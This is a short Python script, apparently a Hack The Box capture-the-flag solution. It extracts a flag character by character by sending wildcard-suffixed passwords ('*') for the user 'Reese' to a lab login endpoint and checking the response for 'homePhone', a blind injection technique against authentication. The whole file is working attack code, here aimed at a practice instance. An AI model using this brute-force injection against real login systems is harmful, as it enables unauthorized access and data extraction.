#!/usr/bin/python3

import string
import requests
from colorama import Fore, Style

PROXY = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
} 

def send_request(url, username, password):
    POST_data = {'username': username, 'password': password}
    # response = requests.post(url, data=POST_data, verify=False, proxies=PROXY)        # For debugging => View the request in Burp, as they are sent to the server.
    response = requests.post(url, data=POST_data)
    if 'homePhone' in response.text:
        return 1
    else:
        return 0

if __name__ == '__main__':

    flag = 'HTB{'
    url = 'http://165.232.97.241:30569/login'       # Docker Instance IP:PORT
    while True:
        printable_characters = string.printable.strip()
        printable_characters = printable_characters.replace('*', '')        # Removing the '*' character, because it messes up with my exploit 
        for character in printable_characters:  
            print('[' + Style.BRIGHT + Fore.BLUE + '*' + Style.NORMAL + Fore.WHITE + f'] Testing {flag+character}')
            resp = send_request(url, 'Reese', flag+character+'*')
            if resp:
                flag += character
                print('')
                print(Style.BRIGHT + '['+ Fore.GREEN + '+' + Fore.WHITE + f'] {flag}')
                print('')
                break
        
        if flag.endswith('}'):
            break
